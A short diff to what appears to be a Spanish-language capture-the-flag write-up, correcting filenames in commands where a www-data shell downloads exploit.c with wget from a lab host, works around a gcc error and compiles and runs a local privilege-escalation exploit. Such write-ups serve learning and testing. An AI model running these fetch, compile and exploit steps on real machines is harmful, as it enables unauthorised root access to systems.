@@ -173,7 +173,7 @@ www-data@ubuntu:/tmp$ wget http://10.2.60.167/exploit.c
 - Si lo intentamos compilar, vemos que nos arroja un problema:
 
 ~~~bash
-www-data@ubuntu:/tmp$ gcc exploit2.c exploit2.o
+www-data@ubuntu:/tmp$ gcc exploit.c -o exploit.o
 gcc: error trying to exec 'cc1': execvp: No such file or directory
 ~~~
 
@@ -186,7 +186,7 @@ export PATH=$PATH:/usr/bin:/bin:/usr/sbin:/sbin:/usr/lowww-
 - Y una vez hecho esto, ejecutamos el exploit compilado:
 
 ~~~bash
-www-data@ubuntu:/tmp$ gcc 37292.c -o exploit.o
+www-data@ubuntu:/tmp$ gcc exploit.c -o exploit.o
 www-data@ubuntu:/tmp$ ./exploit.o 
 spawning threads
 mount #1
